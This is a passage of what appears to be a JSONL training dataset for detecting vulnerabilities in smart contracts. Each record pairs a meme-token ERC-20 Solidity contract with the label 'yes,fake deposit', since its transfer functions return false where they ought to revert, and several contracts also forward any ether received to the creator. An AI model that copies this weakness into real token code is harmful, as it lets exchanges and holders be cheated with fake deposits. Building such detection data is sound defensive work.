\n\nfunction approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\n \n//call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n//receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n//it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract HyperInuShiba is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000000000*10**uint256(decimals);\n string public constant name = \"Hyper Inu Shiba\";\n string public constant symbol = \"HYPERINU\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\ncontract ERC20Token is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n string public name; //Name of the token\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals\n string public symbol; //An identifier: eg AXM\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THE FOLLOWING VALUES FOR YOUR TOKEN!\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\n function ERC20Token(\n ) {\n balances[msg.sender] = 9900000000000000000000000000; // Give the creator all initial tokens (100000 for example)\n totalSupply = 9900000000000000000000000000; // Update total supply (100000 for example)\n name = \"Fenny Penny\"; // Set the name for display purposes\n decimals = 18; // Amount of decimals\n symbol = \"FPN\"; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.9.0;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\n//name this contract whatever you'd like\ncontract HARAMBUCKS is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n\n \n string public name; //fancy name: eg Simon Bucks\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n string public symbol; //An identifier: eg SBX\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THESE VALUES FOR YOUR TOKEN\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\n function HARAMBUCKS(\n ) {\n balances[msg.sender] = 6942000000; // Give the creator all initial tokens (100000 for example)\n totalSupply = 6942000000; // Update total supply (100000 for example)\n name = \"HARAMBUCKS\"; // Set the name for display purposes\n decimals = 5; // Amount of decimals for display purposes\n symbol = \"MONKE\"; // Set the symbol for display purposes\n \n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract NFTChampions is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000*10**uint256(decimals);\n string public constant name = \"NFT Champions\";\n string public constant symbol = \"CHAMP\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract Ethereum_Kiwi is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000000000*10**uint256(decimals);\n string public constant name = \"Ethereum Kiwi\";\n string public constant symbol = \"EKIWI \ud83e\udd5d\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\n//name this contract whatever you'd like\ncontract ERC20Token is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n string public name; //fancy name: eg Simon Bucks\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n string public symbol; //An identifier: eg SBX\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THESE VALUES FOR YOUR TOKEN\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\n function ERC20Token(\n ) {\n balances[msg.sender] = 1000000; // Give the creator all initial tokens (100000 for example)\n totalSupply = 50000000; // Update total supply (100000 for example)\n name = \"IonicTransfertToken\"; // Set the name for display purposes\n decimals = 0; // Amount of decimals for display purposes\n symbol = \"ITT\"; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.25;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n\n}\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n \n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n \n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\ncontract Shepherd is StandardToken { \n\n \n\n \n string public name; \n uint8 public decimals; \n string public symbol; \n string public version = 'Shepherd.0'; \n uint256 public unitsOneEthCanBuy; \n uint256 public totalEthInWei; \n address public fundsWallet; \n\n \n function Shepherd() {\n balances[msg.sender] = 10000000000000000000000000000; \n totalSupply = 10000000000000000000000000000;\n name = \"Shepherd\";\n decimals = 18; \n symbol = \"Shepherd\"; \n unitsOneEthCanBuy = 0; //7% bonus= OneEth// \n fundsWallet = msg.sender; \n }\n\n function() payable{\n totalEthInWei = totalEthInWei + msg.value;\n uint256 amount = msg.value * unitsOneEthCanBuy;\n require(balances[fundsWallet] >= amount);\n\n balances[fundsWallet] = balances[fundsWallet] - amount;\n balances[msg.sender] = balances[msg.sender] + amount;\n\n Transfer(fundsWallet, msg.sender, amount); \n\n fundsWallet.transfer(msg.value); \n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n \n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.16;\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\n//name this contract whatever you'd like\ncontract ERC20Token is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n\n \n string public name; //fancy name: eg Simon Bucks\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n string public symbol; //An identifier: eg SBX\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THESE VALUES FOR YOUR TOKEN\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\n function ERC20Token(\n ) {\n balances[msg.sender] = 10000000000000000000000000000000; // Give the creator all initial tokens (100000 for example)\n totalSupply = 10000000000000000000000000000000; // Update total supply (100000 for example)\n name = \"Dalgona\"; // Set the name for display purposes\n decimals = 18; // Amount of decimals for display purposes\n symbol = \"DALGONA\"; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "//SPDX-License-Identifier: Unlicense\n\n// ----------------------------------------------------------------------------\n// 'SnowShibaInu' token contract\n//\n// Symbol : SNOWINU \u2744\ufe0f\n// Name : Snow Shiba Inu\n// Total supply: 100000000000000\n// Decimals : 18\n//\n// TOTAL SUPPLY 1,000,000,000,000,000\n// 50% Burned\n// ----------------------------------------------------------------------------\n\npragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract SnowShibaInu is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000000000*10**uint256(decimals);\n string public constant name = \"Snow Shiba Inu\";\n string public constant symbol = \"SNOWINU \u2744\ufe0f\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
